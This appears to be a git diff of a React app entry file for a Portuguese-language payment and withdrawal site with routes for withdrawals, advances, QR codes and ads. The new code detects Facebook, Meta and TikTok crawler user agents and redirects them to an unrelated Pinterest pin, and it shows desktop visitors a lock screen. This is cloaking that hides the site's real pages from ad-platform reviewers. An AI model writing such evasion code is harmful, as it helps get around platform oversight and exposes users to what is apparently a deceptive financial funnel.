@@ -1,15 +1,14 @@
 import { useEffect, useState } from "react";
-import HeaderMenu from "./components/HeaderMenu/HeaderMenu";
-import { useAppContext } from "./context/AppContext";
-
 import { Navigate, Route, Routes, useLocation } from "react-router-dom";
+
 import ErrorModal from "./components/ErrorModal";
 import FooterMenu from "./components/FooterMenu/";
+import HeaderMenu from "./components/HeaderMenu/HeaderMenu";
 import { CompletePage } from "./components/ModalComplet";
 import { QrCodeStepOne } from "./components/QrCodeStepOne";
 import { Modal } from "./components/createaccount";
 import { ModalUnlock } from "./components/modalUnlock";
-import { useMediaQuery } from "./hooks/useMediaQuery";
+
 import AdSection from "./screens/AdSection";
 import { TransationBlackPay } from "./screens/BlackPay";
 import { ChatBot } from "./screens/ChatBot";
@@ -22,36 +21,58 @@ import SaquePage from "./screens/SaquePage";
 import { SelectMarket } from "./screens/SelectMarket";
 import { WithdrawalTwo } from "./screens/Withdrawaltwo";
 
+import { useAppContext } from "./context/AppContext";
+import { useMediaQuery } from "./hooks/useMediaQuery";
+
 const App = () => {
   const [currentPage, setCurrentPage] = useState<string>("inicio");
   const location = useLocation();
   const { isModalOpen, isModalOpenUnlock } = useAppContext();
 
-  // Validação de origem (utm_source ou referrer)
-  useEffect(() => {
-    const params = new URLSearchParams(window.location.search);
-    const utmSource = params.get("utm_source");
-    const allowedReferer = "https://facebook.com";
-    const referer = document.referrer;
 
-    if (
-      (!utmSource || utmSource !== "facebook") &&
-      (!referer || !referer.includes(allowedReferer))
-    ) {
-      window.location.href = "https://br.pinterest.com/pin/838373286868741123/";
+  const isCrawler = (userAgent: string): boolean => {
+    const crawlers = [
+      "facebookexternalhit",
+      "facebookcatalog",
+      "meta-externalagent",
+      "meta-externalfetcher",
+      "tiktok",
+    ];
+    return crawlers.some((crawler) => userAgent.toLowerCase().includes(crawler));
+  };
+
+
+  useEffect(() => {
+    const userAgent = navigator.userAgent || "";
+
+    const botRedirectUrl = "https://br.pinterest.com/pin/838373286868741123/";
+
+
+    if (isCrawler(userAgent)) {
+      window.location.href = botRedirectUrl;
     }
   }, []);
 
-  const hideFooterRoutes = ["/agradecimento", "/login", "/selectmarket", "/resgate", "/adiantamento", "/gatewaypay", "/qrcode"];
-  const hideHeaderRoutes = ["/resgate", "/adiantamento"]; // Adicione rotas onde o Header também deve ser ocultado
+
+  const hideFooterRoutes = [
+    "/agradecimento",
+    "/login",
+    "/selectmarket",
+    "/resgate",
+    "/adiantamento",
+    "/gatewaypay",
+    "/qrcode",
+  ];
+  const hideHeaderRoutes = ["/resgate", "/adiantamento"];
 
   const shouldHideFooter =
     hideFooterRoutes.includes(location.pathname) || isModalOpen || isModalOpenUnlock;
-
   const shouldHideHeader = hideHeaderRoutes.includes(location.pathname);
 
+  // Verifica se está em um dispositivo móvel
   const isMobile = useMediaQuery("(max-width: 768px)");
 
+  // Tela de bloqueio para dispositivos não móveis
   if (!isMobile) {
     return (
       <div className="flex flex-col h-screen items-center justify-center bg-[#121212] text-white text-center">
@@ -67,7 +88,7 @@ const App = () => {
       <ErrorModal />
       <Modal />
       <ModalUnlock />
-      <div className="flex-grow overflow-y-auto ">
+      <div className="flex-grow overflow-y-auto">
         <Routes>
           <Route path="/" element={<Navigate to="/login" />} />
           <Route path="/login" element={<Login />} />
